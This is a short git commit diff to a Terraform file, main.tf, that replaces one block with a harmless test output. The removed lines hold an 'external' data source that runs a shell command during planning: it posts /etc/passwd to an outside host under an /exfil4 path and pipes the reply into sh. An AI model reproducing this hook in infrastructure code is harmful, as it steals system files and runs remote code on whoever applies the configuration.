c8e6594f0489673a2c3cc541d1ce2f32e0b43098
snehak7-cyber <snehakkaran.7@gmail.com>
2026-09-04 11:24:39 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,4 +1,3 @@
-data "external" "example" {
- program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
-https://fzi6s93ujh0hgsgy06ymaprpug08o2cr.net-spi.com/exfil4 | sh"]
+output "marker" {
+  value = "test-v2"
 }
